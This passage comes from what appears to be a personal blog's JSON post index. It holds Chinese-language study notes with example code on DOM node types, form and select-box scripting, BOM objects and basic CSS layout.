title：包含元素的额外信息，通常以提示条形式展示 lang：元素内容的语言代码 dir：语言的书写方向（ltr从左到右，rtl从右到左) className:相当于class属性，用于指定元素的CSS类 取得属性1234567891011121314151617181920212223//使用对象属性&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;myDiv&quot; class=&quot;bd&quot; title=&quot;Body text&quot; lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;2&lt;/div&gt; &lt;script&gt; var div=document.getElementById(&quot;myDiv&quot;); alert(div.id); alert(div.className); alert(div.title); alert(div.lang); alert(div.dir); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;//使用getAttribute()方法alert(div.getAttribute(&quot;class&quot;)); getAttribute()主要用于取得自定义属性的值，其他情况使用对象属性 设置属性setAttribute():接收两个参数，要设置的属性名和属性值,如果属性存在则用指定的值替换原来的值 1234567//直接给对象属性赋值div.id=&quot;someOtherId&quot;//在对象属性上添加自定义属性，不会让它变成元素的属性div.mycolor=&quot;red&quot;;alert(div.getAttribute(&quot;mycolor&quot;));//null//使用setAttribute赋值div.setAttribute(&quot;id&quot;,&quot;someOtherId&quot;); attributes属性attributes属性包含一个NamedNodeMap实例，是一个类似NodeList的“实时”集合，元素的每个属性都表示为一个Attr节点，并保存在NamedNodeMap对象中 attributed属性中的每个节点的nodeName是对应属性的名字，nodeValue是属性的值 12345678function outputAttributes(element)&#123; let pairs=[]; for(let i=0,len=element.attributes.length;i&lt;len;++i)&#123; const attribute=element.attributes[i]; pairs.push(`$&#123;attribute.nodeName&#125;=$&#123;attribute.nodeValue&#125;`); return pairs.join(&quot; &quot;); &#125;&#125; 创建元素document.createElement():一个参数，即要创建元素的标签名 1234let div=document.createElement(&quot;div&quot;);div.id=&quot;myNewDiv&quot;;div.className=&quot;box&quot;;document.body.appendChild(div); Text 类型Text节点由Text类型表示，包含按字面解释的纯文本，也可能包含转义后的HTML字符，Text节点中包含的文本可以通过nodeValue或者data属性访问 nodetype=3 nodeName=”#text” nodeValue值为节点中包含的文本 parentNode值为Element对象 不支持子节点 appendData(text):向节点末尾添加文本text deleteData(offset,count),从位置offset开始删除count个字符 insertData(offset,text),在位置offset插入text； replaceData(offset,count,text)，用text替换从位置offset到offset+count大的文本 splitText(offset),在位置offset将当前文本节点拆分为两个文本节点 substringData(offset,count),提取从位置offset到offset+count的文本 包含文本内容的每个元素最多只能有一个文本节点 创建文本节点document.createTextNode():创建新文本节点，接收一个参数，即要插入节点的文本 123456789let element=document.createElement(&quot;div&quot;);element.className=&quot;message&quot;;let textNode=document.createTextNode(&quot;Hello world!&quot;);element.appendChild(textNode);let anotherTextNode=document.createTextNode(&quot;Yippee&quot;);element.appendChild(anotherTextNode);document.body.appendChild(element); 规范化文本节点合并文本节点1234567891011let element=document.createElement(&quot;div&quot;);element.className=&quot;message&quot;;let textNode=document.createTextNode(&quot;Hello World&quot;);element.appendChild(textNode);let anotherTextNode=document.createTextNode(&quot;Yippee&quot;);element.appendChild(anotherTextNode);document.body.appendChild(element);alert(element.childNodes.length);//2element.normalize();alert(element.childNodes.length);//1alert(element.firstChild.nodeValue); 拆分文本节点12345678910let element=document.createElement(&quot;div&quot;);element.className=&quot;message&quot;;let textNode=document.createTextNode(&quot;Hello World&quot;);element.appendChild(textNode);document.body.appendChild(element);let newNode=element.firstChild.splitText(5);alert(element.fiestChild.nodeValue);//&quot;Hello&quot;alert(newNode.nodeValue);//&quot;world&quot;alert(element.chileNodes.length);//2 Comment类型 nodeType=8 nodeName=”#comment” nodeValue值为注释内容 parentNode值为Document或Element对象 不支持子节点 Comment类型与Text类型继承自同一个基类(CharacterData),因此拥有除splitText之外的Text节点所有的字符串操作方法 CDATASection类型继承Text类型，拥有除splitText之外的Text节点所有的字符串操作方法 DocumentType类型 在DOM Level1中不支持动态创建，只能在解析文档代码时创建，DocumentType对象保存在document.doctype属性中. DocumentType对象有3个属性：name,entities,notations. name是文档名称，entities是这个文档类型描述实体的NameNodeMap,而notations是这个文档类型描述的表示法的NamedNodeMap. 浏览器文档通常是HTML或XHTML类型，所以entities和notations列表为空，只有name属性有用，包含文档类型的名称 DocumentFragment类型 nodeType=11 nodeName=”#document-fragment” nodeValue=null parentNode=null 子节点可以是Element,ProcessingInstruction,Comment,Text,CDATASection 充当其他要被添加的文档节点的仓库 123456789&lt;ul id=&quot;myList&quot;&gt;&lt;/ul&gt;let fragment=document.createDocumentFragment();let ul=document.getElementById(&quot;myList&quot;);for(let i=0;i&lt;3;i++)&#123; let li=document.createElement(&quot;li&quot;); li.appendChild(document.createTextNode(`Item $&#123;i+1&#125;`)); fragment.appendChild(li);&#125;ul.appendChild(fragment); Attr类型属性是存在于元素attributes属性中的节点 nodeType=2 nodeName值为属性名 nodeValue值为属性值 parentNode值为null Attr对象上3个属性 name包含属性名 value包含属性值 specified是一个布尔值，表示属性使用的是默认值和还是被指定的值 1234567let attr=document.createAttribute(&quot;align&quot;);//创建新的Attr节点，参数为属性名attr.value=&quot;left&quot;;element.setAttributeNode(attr);//添加属性节点alert(element.attributes[&quot;align&quot;].value);//返回对应属性节点alert(element.getAttributeNode(&quot;align&quot;).value);//返回对应属性节点alert(element.getAttribute(&quot;align&quot;));//只返回属性值","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"选择框编程","slug":"选择框编程","date":"2021-12-12T09:07:36.000Z","updated":"2021-12-30T07:18:26.023Z","comments":true,"path":"2021/12/12/选择框编程/","link":"","permalink":"https://coloey.github.io/2021/12/12/%E9%80%89%E6%8B%A9%E6%A1%86%E7%BC%96%E7%A8%8B/","excerpt":"","text":"选项处理使用选择框的selectedIndex属性 123456789101112131415161718192021222324252627282930 &lt;form method=&quot;post&quot;&gt; &lt;select name=&quot;location&quot; id=&quot;selLocation&quot;&gt; &lt;option value=&quot;Sunnyvalue,CA&quot;&gt;Sunnyvalue&lt;/option&gt; &lt;option value=&quot;Los Angeles,CA&quot;&gt;Los Angeles&lt;/option&gt; &lt;option value=&quot;Mountain View,CA&quot;&gt;Mountain View&lt;/option&gt; &lt;option value=&quot;&quot;&gt;China&lt;/option&gt; &lt;option &gt;Australia&lt;/option&gt; &lt;/select&gt; &lt;/form&gt; &lt;script src=&quot;example3.js&quot;&gt;&lt;/script&gt; let selectbox=document.forms[0].elements[&quot;location&quot;];function getSelectedOptions(selectbox)&#123; let result=new Array(); for(let option of selectbox.options)&#123; if(option.selected)&#123; result.push(option); &#125; &#125; return result;&#125;let selectedOptions=getSelectedOptions(selectbox);let message=&quot;&quot;;for(let option of selectedOptions)&#123; message+=`Selected index:$&#123;option.index&#125;\\n`+`Selected text:$&#123;option.text&#125;\\n`+`Selected value:$&#123;option.value&#125;\\n`;&#125;console.log(message); 添加选项动态创建选项1234let newOption=document.createElement(&quot;option&quot;);newOption.appendChild(document.createTextNode(&quot;Option text&quot;));newOption.setAttribute(&quot;value&quot;,&quot;Option value&quot;);selectbox.appendChild(newOption); 使用Option构造函数创建选项,接收两个参数：text和value，用选择框的add方法添加选项 12let newOption=new Option(&quot;Option text&quot;,&quot;Option value&quot;);selectbox.add(newOption,undefined);//在列表末尾添加选项 移除选项123456789selectbox.removeChild(selectbox.options[0]);//移除第一项selectbox.remove(0);//移除第一项selectbox.options[0]=null;//清除选项框的所有选项function clearSelectbox(selectbox)&#123; for(let option of selectbox.options)&#123; selectbox.remove(0); &#125;&#125; 移动和重排选项1234let selectbox1=document.getElementById(&quot;selLocations1&quot;);let selectbox2=document.getElementById(&quot;selLocations2&quot;);selectbox2.appendChild(selectbox1.options[0]);//将选项从第一个选择框移动到另一个选择框 重排选项 123456let selectbox1=document.getElementById(&quot;selLocations1&quot;);let optionToMove=selectbox1.options[1];selectbox1.insertBefore(optionToMove,selectbox1.options[optionToMove.index-1]);//将要重排的选项移动到它原先位置的前前面let selectbox1=document.getElementById(&quot;selLocations1&quot;);let optionToMove=selectbox1.options[1];selectbox1.insertBefore(optionToMove,selectbox1.options[optionToMove.index+2]);//将要重排的选项移动到它原先位置的后面一位","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"文本框编程","slug":"文本框","date":"2021-12-09T12:46:20.000Z","updated":"2021-12-30T07:18:16.782Z","comments":true,"path":"2021/12/09/文本框/","link":"","permalink":"https://coloey.github.io/2021/12/09/%E6%96%87%E6%9C%AC%E6%A1%86/","excerpt":"","text":"文本框编程表示文本框的两种方式123456&lt;input type=&quot;text&quot; size=&quot;25&quot; maxlength=&quot;50&quot; value=&quot;initial value&quot;&gt; //创建多行文本框 &lt;textarea rows=&quot;25&quot; cols=&quot;5&quot;&gt;initial value&lt;/textarea&gt;//用使用value属性读写文本框let textbox=document.forms[0].elements[&quot;textbox1&quot;];textbox.value=&quot;Some new value&quot;; 选择文本select()用于全选文本 123456let form=document.getElementById(&quot;myForm&quot;); let textbox=form.elements[0]; textbox.addEventListener(&quot;focus&quot;,(event)=&gt;&#123; event.target.select(); console.log(`Text selected:$&#123;textbox.value&#125;`); &#125;); setSelectionRange()用于部分选择文本 1234567let form=document.getElementById(&quot;myForm&quot;);let textbox=form.elements[0];textbox.addEventListener(&quot;focus&quot;,(event)=&gt;&#123; event.target.select(); textbox.setSelectionRange(0,1); console.log(`Text selected:$&#123;textbox.value&#125;`); &#125;); 屏蔽按键12345textbox.addEventListener(&quot;keypress&quot;,(event)=&gt;&#123; if(!/\\d/.test(String.fromCharCode(event.charCode))&amp;&amp;event.charCode&gt;9&amp;&amp;!event.ctrlKey)&#123;//屏蔽非数字字符但允许同样触发keypress事件的所有基础按键以及ctrl键 event.preventDefault(); &#125;&#125;) 自动切换1234567891011121314151617181920212223242526&lt;form method=&quot;post&quot;&gt; &lt;input type=&quot;text &quot; name=&quot;tel1&quot; id=&quot;textTel1&quot; maxlength=&quot;3&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;tel2&quot; id=&quot;textTel2&quot; maxlength=&quot;3&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;tel3&quot; id=&quot;textTel3&quot; maxlength=&quot;4&quot;&gt; &lt;/form&gt; let inputIds=[&quot;textTel1&quot;,&quot;textTel2&quot;,&quot;textTel3&quot;];for(let id of inputIds)&#123; let textbox=document.getElementById(id); textbox.addEventListener(&quot;keyup&quot;,(event)=&gt;&#123; let target=event.target; if(target.value.length==target.maxLength)&#123; let form=target.form; for(let i=0,len=form.elements.length;i&lt;len;i++)&#123; if(form.elements[i]==target)&#123; if(form.elements[i+1])&#123; form.elements[i+1].focus(); &#125; return; &#125; &#125; &#125; &#125;); &#125;;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"表单","slug":"表单","date":"2021-12-09T12:11:33.000Z","updated":"2021-12-30T07:17:44.744Z","comments":true,"path":"2021/12/09/表单/","link":"","permalink":"https://coloey.github.io/2021/12/09/%E8%A1%A8%E5%8D%95/","excerpt":"","text":"表单禁用表单避免多次提交表单可以在第一次点击后禁用表单 12345678let form=document.getElementById(&quot;myForm&quot;);form.addEventListener(&quot;submit&quot;,(event)=&gt;&#123; let target=event.target; //取得提交按钮 let btn=target.elements[&quot;submit-btn&quot;]; //禁用提交按钮 btn.disabled=true;&#125;) focus()把焦点设置到表单字段,这意味着该字段会变成活动字段并可以响应键盘事件,autofocus()会自动为带有该属性的元素设置焦点 12345678let form=document.getElementById(&quot;myForm&quot;);window.addEventListener(&quot;load&quot;,(event)=&gt;&#123; let element=form.elements[0]; if(element.autofocus!==true)&#123; element.focus(); console.log(&quot;JS focus&quot;); &#125; &#125;) 表单的公共事件","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"BOM","slug":"BOM","date":"2021-11-25T12:47:05.000Z","updated":"2021-12-30T07:04:56.946Z","comments":true,"path":"2021/11/25/BOM/","link":"","permalink":"https://coloey.github.io/2021/11/25/BOM/","excerpt":"","text":"BOMlocation对象提供当前窗口加载文档的信息，以及通常的导航功能，它既是window的属性也是document的属性。 查询字符串123456789101112131415161718let getQueryStringArgs=function()&#123; //取得没有开头问号的查询字符串 let qs=(location.search.length&gt;0)?location.search.substring(1):&quot;&quot;; let args=&#123;&#125;; for(let item of(qs.split(&#x27;&amp;&#x27;).map(kv=&gt;kv.split(&#x27;=&#x27;))))&#123; let name=item[0]; value=item[1]; if(name.length)&#123; args[name]=value; &#125; &#125; return args;&#125;//qs=&quot;?q=javaScript&amp;num=10&quot;;let args=getQueryStringArgs();alert(args[&quot;q&quot;]);alert(args[&#x27;num&#x27;]); 使用USLSearchParams检查和修改查询字符串 123456789101112let qs=&quot;?q=javaScript&amp;num=10&quot;;let searchParams=new URLSearchParams(qs);alert(searchParams.toString());searchParams.has(&quot;num&quot;);searchParams.get(&quot;num&quot;);searchParams.set(&quot;page&quot;,&quot;3&quot;);alert(searchParams.toString());searchParams.delete(&quot;q&quot;);alert(searchParams.toString());for(let param of searchParams)&#123; console.log(param);&#125; 操作地址通过修改location对象修改浏览器地址，使用assign方法传进一个URL,会导航到新URL同时在浏览器历史记录增加一条记录，下面三种方法功能相同 123location.assign(&quot;http://www.wrox.com&quot;);window.location=&quot;http://www.wrox.com&quot;;location.href=&quot;http://www.wrox.com&quot;; 通过修改location属性可以修改当前加载的页面,hash,search,hostname,pathname.port属性被设置为新值后会修改当前的URL 123456789101112//假设当前URL为http://www.wrox.com/WileyCDA/location.assign(&quot;http://www.wrox.com/WileyCDA&quot;);//把URL修改为http://www.wrox.com/WileyCDA/#section1location.hash=&quot;#section1&quot;;//把URL修改为http://www.wrox.com/WileyCDA/?q=javascriptlocation.search=&quot;?q=javascript&quot;;//把URL修改为http://www.somewhere.com/WileyCDA/location.hostname=&quot;www.somewhere.com&quot;;//把URL修改为http://www.somewhere.com/mydir/location.pathname=&quot;mydir&quot;;//把URL修改为http://www.somewhere.com:8080/WileyCDA/location.port=8080; 以上的修改会在浏览器中增加记录，点击后退即可导航到前一个界面，不希望增加历史记录可以使用replace()方法，reload()可以重新加载当前页面，如果页面自从上次请求后没有修改过，则浏览器可能会从缓存中加载页面，如果想强制从服务器中加载，必须传入true history对象history用来导航历史记录，同时不会暴露用户访问过的URL。 12345678history.go(-1);//后退一页history.go(1);//前进一页history.go(&quot;wrox.com&quot;)//导航到最近的wrox.com页面//go有两个简写方法：back()和forward()history.back();//后退一页history.forward()//前进一页//history的length属性记录历史记录有多少条目if(history.length==1)&#123;//这是用户窗口第一个页面&#125; navigator对象navigator对象通常用来确定浏览器的类型 检测插件123456789101112131415161718192021222324252627282930313233343536function hasPlugin(name)&#123; name=name.toLowerCase(); for(let plugin of window.navigator.plugins)&#123; if(plugin.name.toLowerCase().indexOf(name)&gt;-1)&#123;return true;&#125; &#125; return false;&#125;//alert(hasPlugin(&quot;Flash&quot;));//alert(hasPlugin(&quot;QuickTime&quot;));function hasIEPlugin(name)&#123; try&#123; new ActiveXObject(name); return true; &#125;catch(ex)&#123; return false; &#125;&#125;//在所有浏览器中检测插件function hasFlash()&#123; var result=hasPlugin(&quot;Flash&quot;); if(!result)&#123; result=hasIEPlugin(&quot;ShockwaveFlash.ShockwaveFlash&quot;); &#125;return result;&#125;function hasQuickTime()&#123; var res=hasPlugin(&quot;QuickTime&quot;); if(!res)&#123; res=hasIEPlugin(&quot;QuickTime.QuickTime&quot;); &#125; return res;&#125;alert(hasFlash());alert(hasQuickTime()); 注册处理程序registerProtocolHandler()方法可以把一个网站注册处理为某种特定类型信息应用程序，传入3个参数：要处理的协议（“mailto或ftp),处理该协议的URL，以及应用名称 例如，把一个Web应用程序注册为默认客户端 1navigator.registerProtocolHandler(&quot;mailto&quot;,&quot;http://www.somemailclient.com?cmd=%s&quot;,&quot;Some Mail Client&quot;);","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"CSS基础","slug":"HTML+CSS","date":"2021-11-25T12:42:24.000Z","updated":"2022-08-13T16:21:51.496Z","comments":true,"path":"2021/11/25/HTML+CSS/","link":"","permalink":"https://coloey.github.io/2021/11/25/HTML+CSS/","excerpt":"","text":"定位：定位总结： static: 不脱标，不能使用边偏移 relative:不脱标（占有位置），可用margin,相对于自身位置移动 absolute:脱标（不占有位置）,不可用margin,带有定位的父级 fixed：脱标（不占有位置），浏览器可视区 sticky:不脱标（占有位置），浏览器可视区 绝对定位特点：如果没有祖先元素或者祖先元素没有定位，则以浏览器为准定位 如果祖先元素有定位（相对，绝对，固定定位）则以最近一级的有定位的祖先元素为参考点移动位置 绝对定位不占有原先的位置（脱标） 叠放次序 z-index在使用定位布局时，可以使用z-index来控制盒子的前后次序 语法： 选择器{z-index:1;} 数值可以是正整数，负整数或者0，默认是auto，数值越大，盒子越靠上 如果属性相同，则按照书写顺序，后来居上 数字后面不能加单位 只有定位的盒子才有z-index属性 定位的拓展1.绝对定位盒子居中 left:50% margin-left:-100px; 2.定位特殊性：绝对定位固定定位和浮动相似 行内元素添加绝对或者固定定位，可以直接设置高度和宽度（span) 块级元素添加绝对或者固定定位，如果不给宽度或者高度，默认大小是内容的大小 脱标的盒子不会触发外边距合并问题 3.绝对定位（固定定位）会完全压住盒子浮动元素只会压住下面标准流的盒子，但是不会压住下面标准流的文字（图片）但是绝对定位（固定定位）会压住下面标准流的所有内容 浮动之所以不会压住下面文字是因为浮动最初的目的是为了做文字环绕效果 元素里的显示和隐藏display 显示隐藏元素 但是不保留位置 隐藏元素不想要原来位置，用none，否则用block visibility显示隐藏元素 但是保留原来的位置,visible为元素可见，hidden为元素隐藏 overflow 溢出显示隐藏 但是只是对于溢出的部分处理,scoll:溢出的部分显示滚动条，visible:溢出部分可见,hidden:溢出部分不可见,auto:没溢出则不显示滚动条，溢出则超出部分显示滚动条。 用户界面样式鼠标样式cursorli &#123;cursor: pointer; &#125; default 默认小白鼠标 pointer 小手 move 移动 text 文本 not-allowed 禁止 vertical-align实现行内块和文字居中对齐vertical-align:middle 解决图片底部默认空白空隙：图片底侧会有一个空白缝隙，原因是行内块元素会和文字的基线对齐解决方法：1.给图片添加vertical-align:middle或者top或者bottom 2.把图片转为块级元素 display:block 单行文字溢出显示省略号white-space:nomal:如果文字显示不开自动换行 white-space:nowrap:如果文字显示不开强制一行内显示 overflow:hidden(溢出部分隐藏) text-overflow:ellipsis(文字溢出部分用省略号显示) 多行文本溢出显示省略号​ width: 150px; ​ height: 65px; ​ background-color: pink; ​ margin: 100px auto; ​ overflow: hidden; ​ text-overflow: ellipsis; ​ display: -webkit-box; ​ /* 从第几行开始省略 */ ​ -webkit-line-clamp: 3; ​ -webkit-box-orient: vertical; 常见布局技巧margin负值使用让每个盒子margin往左移动-1px，正好压住相邻盒子的边框 鼠标经过盒子提高当前盒子层级（如果没有定位，则加相对定位（保留位置）如果都有定位则用z-index) 文字围绕浮动元素三角形制作 weight:0; height:0; border-color:transparent red transparent transprent; border-style:solid; border-width:22px 8px 0 0;(上面的宽，右边的小一些) HTML新标签header:头部标签 nav：导航标签 article:内容标签 section:定义文档某个区域 aside:侧边栏标签 footer：尾部标签 主要针对搜索引擎，这些新标签页面中可以使用多次，在IE9中，需要把这些元素转换为块级元素 视频用mp4格式 autoplay:自动播放 controls:向用户使用播放控件 width:设置播放器宽度 height:设置高度 loop:是否循环播放 src：url（视频url地址） poster:加载等待的画面图片 muted：静音播放 新增input表单type=”email” type=”url” type=”date” type=”time” type=”month” type=”week” type=”numbers” type=”tel” type=”search” type=”color” input属性 required=”requied”表示该内容不能为空，必填 placeholder=”placeholder”提示文本，表单提示信息 autofocus=”autofocus”自动聚焦属性，页面加载完成自动聚焦到指定表单 autocomplete：默认为on，当用户键入字段时基于之前键入的值显示出字段，关闭为off multiple:可以多选文件提交 新增选择器属性选择器（特殊性0,0,1,0)E[att]选择具有att属性的E元素 E[att=”val”]选择具有att属性且属性值等于val的E元素 E[att^=”val”]选择具有att属性且属性值以val开头 E[att$=”val”]选择具有att属性且属性值中含有val的E元素 伪类选择器E:first-child:匹配父元素的第一个子元素 E:last-child:匹配父元素的最后一个元素 E:nth-child(n)匹配父元素的第n个元素 E:nth-child(even)匹配父元素的第偶数个元素，odd则第奇数个元素 E:nth-child(n)，从0开始计算，但是第0个元素或者超出元素个数会被忽略 nth-child(2n):偶数，2n+1:奇数 5n:5 10 15… n+5:从第5个开始到最后 -n+5：前5个（包含第5个） nth-of-type():会把指定孩子排序号，执行的时候先看E指定的元素，之后根据E回去看是第几个孩子 nth-child:对于父元素里面所有孩子进行排序选择，先找到第n个孩子，然后看着是否和E匹配 无序列表用nth-child比较多 类选择器，属性选择器和伪类选择器权重为10 伪元素选择器::before:在元素内部的前面插入内容 ::after:在元素内部的后面插入内容 before和after创建一个元素，属于行内元素 新创建的这个元素在文档树中找不到，因此称为伪元素 语法：element::before{}, before和after必须有content属性 伪元素和标签选择器一样，权重为1 伪元素选择器：清除浮动.clearfix:after { content:’’; display:block;//插入的元素必须是块级 height:0;//不要看见这个元素 clear:both; visibility:hidden;//不要看见这个元素 } .clearfix:before,.clearfix:after { content:’’; diaplay:table;//元素在一行显示且转化为块级元素 } CSS盒子模型box-sizing:content-box，盒子大小为width+padding+border(CSS3之前默认) box-sizing:border-box,盒子大小为width 如果盒子模型我们改为了box-sizing：border-box，那padding和border就不会撑大盒子（前提padding和border不会超过width宽度） CSS过渡（重点）transition:要过渡的属性 花费时间 运动曲线 何时开始 1属性：想要变化的CSS属性，宽度高度 背景颜色内外边距都可以 如果想要所有属性都变化过度则用all 2花费时间：单位是秒（必需写单位 3运动曲线默认为ease 4何时开始：单位是秒 可以设置延迟触发时间 默认是0s CSS filter属性修改图片的颜色为黑白 1img&#123;filter:grayscale(100%)&#125;","categories":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"}],"tags":[]},{"title":"DOM扩展","slug":"DOM扩展","date":"2021-11-25T08:47:24.000Z","updated":"2021-12-30T07:17:21.260Z","comments":true,"path":"2021/11/25/DOM扩展/","link":"","permalink":"https://coloey.github.io/2021/11/25/DOM%E6%89%A9%E5%B1%95/","excerpt":"","text":"Selectors APIquerySelector()接收CSS选择符参数，返回匹配模式的第一个后代元素，如果没有匹配项则返回null 12345678let body=document.querySelector(&quot;body&quot;);//取得id名为myDiv的元素let myDiv=document.querySelector(&quot;#myDiv&quot;);//取得类名为“selector&quot;的第一个元素let selected=document.querySelector(&quot;.selected&quot;);//取得类名为&quot;button&quot;的图片let img=document.querySelector(&quot;img.button&quot;); querySelectorAll()接收一个查询参数，返回所有匹配的节点，即一个NodeList的静态实例 1234567891011//取得id为&#x27;myDiv&#x27;的&lt;div&gt;元素中的所有&lt;em&gt;元素let ems=document.getElementByid(&#x27;myDiv&#x27;).querySelectorAll(&quot;em&quot;);//取得所有类名中包含&#x27;selected&#x27;的元素let selecteds=document.querySelectorAll(&quot;.selected&quot;);//取得所有是&lt;p&gt;元素子元素的&lt;strong&gt;元素let strongs=document.querySelectorAll(&quot;p strong&quot;);for(let strong of strongs)&#123; strong.className=&quot;important&quot;; //strong.item(i).className=&quot;important&quot;; //strong[i].className=&quot;important&quot;;&#125; HTML5getElementsByClassName()接收一个参数，即包含一个或多个类名的字符串，返回类名中包含相应类的元素的NodeList 1234//取得所有类名中包含&#x27;username&#x27;和&#x27;current&#x27;元素let allCurrentUsernames=document.getElementsByClassName(&quot;username current&quot;);//取得id为“myDiv&quot;的元素子树中所有包含&#x27;selected’类的元素let selected=document.getElementById(&quot;myDiv&quot;).getElementsByClassName(&quot;selected&quot;); 这个方法返回以调用它的对象为根元素的子树中所有匹配的元素，在document上调用getElementsByClassName()返回文档中所有匹配的元素，而在特定元素中调用getElementsByClassName()返回该元素后代中匹配的元素 classList属性 add(value) contains(value) remove(value) toggle(value)：如果类名列表中已经存在指定的value，则删除，如果不存在，添加 123456div.classList.remove(&quot;disabled&quot;);div.classList.add(&quot;current&quot;);//检测类名if(div.classList.contains(&quot;bd&quot;)&amp;&amp;!div.classList.contains(&quot;disabled&quot;))&#123; &#125; 焦点管理12345let button=document.getElementById(&quot;myButton&quot;);button.focus();console.log(document.activeElement===button);console.log(document.hasFocus());//true文档已经拥有焦点","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]}],"categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"},{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"React","slug":"React","permalink":"https://coloey.github.io/categories/React/"},{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"},{"name":"项目总结","slug":"项目总结","permalink":"https://coloey.github.io/categories/%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/"},{"name":"Vue3源码","slug":"Vue3源码","permalink":"https://coloey.github.io/categories/Vue3%E6%BA%90%E7%A0%81/"},{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"},{"name":"算法","slug":"算法","permalink":"https://coloey.github.io/categories/%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"算法/链表","permalink":"https://coloey.github.io/categories/%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"},{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"},{"name":"webpack","slug":"前端工程化/webpack","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack/"},{"name":"浏览器","slug":"浏览器","permalink":"https://coloey.github.io/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://coloey.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"HTTP","slug":"计算机网络/HTTP","permalink":"https://coloey.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/"},{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"},{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"http","slug":"http","permalink":"https://coloey.github.io/categories/http/"},{"name":"Vue","slug":"Node/Vue","permalink":"https://coloey.github.io/categories/Node/Vue/"},{"name":"HTML","slug":"HTML","permalink":"https://coloey.github.io/categories/HTML/"},{"name":"git","slug":"git","permalink":"https://coloey.github.io/categories/git/"},{"name":"vim","slug":"vim","permalink":"https://coloey.github.io/categories/vim/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"},{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"tags":[{"name":"Deep dive with Evan You","slug":"Deep-dive-with-Evan-You","permalink":"https://coloey.github.io/tags/Deep-dive-with-Evan-You/"},{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/tags/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"},{"name":"手撕代码","slug":"手撕代码","permalink":"https://coloey.github.io/tags/%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/tags/JavaScript/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://coloey.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/tags/Node/"},{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/tags/CSS/"},{"name":"watch","slug":"watch","permalink":"https://coloey.github.io/tags/watch/"}]}